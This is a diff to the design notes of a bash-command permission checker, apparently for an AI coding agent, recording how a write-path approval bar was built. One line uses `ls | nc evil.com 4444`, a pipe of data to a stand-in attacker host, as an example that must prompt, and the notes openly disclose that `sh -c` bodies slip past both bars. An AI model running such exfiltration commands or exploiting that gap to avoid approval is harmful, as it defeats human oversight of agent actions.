@@ -1381,7 +1381,8 @@ the rest were closed by 3.33–3.37. Each release below carries its rows as
    or covered by its own signature grant, exactly like a `&&` / `;` list item.
    `ls | wc -l` still auto-allows; `ls | nc evil.com 4444` prompts for the `nc`
    stage. Today the signature is stage 0, so an `ls` grant covers the pipe.
-3. **G3 — manual mode gets a real WRITE bar for bash.** `analysis.writePaths`
+3. **G3 — manual mode gets a real WRITE bar for bash.** *(Built, 3.39.0.)*
+   `analysis.writePaths`
    (output redirects, `rm`/`mv`/`cp`/`tee`/`sed -i`/`truncate`/`patch` targets,
    `sort -o`, write-capable code bodies) is checked against cwd ∪
    `allowedWritePaths`; a READ grant never satisfies a write. Closes Tension 2:
@@ -1389,6 +1390,36 @@ the rest were closed by 3.33–3.37. Each release below carries its rows as
    `mkdir ~/.pi/agent/…` and `touch ~/.pi/agent/…` auto-allow because `~/.pi` is
    an `allowedReadPath`. The `mkdir`/`touch`/`mktemp` carve-out stays, but is
    location-scoped.
+   Landed as a closed operand-ROLE table, `analysis/write-roles.ts`
+   (`writeOperandIndices(cmd, args, skipArgs)`, `tarWrites()`): the verb decides
+   which position is the destination — ALL / LAST / FIRST / IN-PLACE — instead
+   of a flat list of "commands that write", so the new verbs come free of the
+   table rather than one bespoke special case each. Deliberate deviations from
+   the wording above:
+   - **Closed world**: no table entry ⇒ no write operand claimed (nothing new
+     gets looser; the location simply stays unscopable). Added to
+     `pathAwareCommands` while at it: `rmdir`, `unlink`, `truncate`, `ln`,
+     `install`; `>/dev/{zero,urandom,random,full}` joined `SAFE_SYSTEM_PATHS`
+     so the device writes do not start prompting.
+   - **`ln` is `WRITE_LAST`, not `WRITE_ALL`**: its first operand is a name the
+     link points at and is never written; ALL would demand write access to a
+     file the command only reads.
+   - **`gzip`/`gunzip`/`xz` are `WRITE_ALL`**: the derived `.gz` lands beside
+     each operand, and naming the operand is how the bar sees that target.
+   - The spec's "write-capable code bodies" became **provenance**: the parser
+     records which segment each code body came from (`bodyPathsBySegment`,
+     `shellBodyBySegment`) and folds the bodies' writes into that segment's
+     write set, so writes inside a `$(…)`/heredoc/multi-line literal reach the
+     parent's bar. `>|` (noclobber) counts as a write redirect.
+   - `BashPromptData.outsideWriteDirs` / `needsWriteApproval` are **optional**
+     fields (the `unresolved?` precedent) rather than edits to ~10 fixtures;
+     absent means "no write claim", which is what the hand-built ones state.
+   - Out of scope, documented: a `SHELL_INTERPRETERS` body (`sh -c 'echo > ~/.pi/agent/x'`)
+     mints no paths at all (`paths=[]`, `writePaths=[]`), so neither bar sees it
+     and the /dspa floor passes it (pre-existing read-bar gap;
+     widening it would mint new read-bar prompts for `bash -c` signature grants).
+     dspa keeps its own write handling (`baseWriteAccess`, D18) and does not get
+     the manual-mode fields — manual-only feature by design.
 4. **G4 — path-qualified `argv0`: system dirs or path operand.** *(Built,
    3.39.0.)* Landed as a leaf module, `analysis/argv0-path.ts`
    (`classifyArgv0(word, base)`, `classifyStageArgv0(stageText, base)`), and the
